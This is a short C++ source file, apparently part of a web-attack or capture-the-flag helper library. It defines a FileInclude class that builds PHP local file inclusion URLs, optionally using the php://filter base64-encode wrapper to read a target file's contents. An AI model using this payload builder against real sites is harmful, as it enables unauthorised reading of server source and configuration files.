#include "PHPTricks.h"

FileInclude::FileInclude(std::string s, std::string t, bool b) 
	:src(s), target(t), base64_encode(b) {}
std::string FileInclude::toString() {
	return src + "?file=" + (base64_encode ? "php://filter/read=convert.base64-encode/resource=" : "") + target;
}
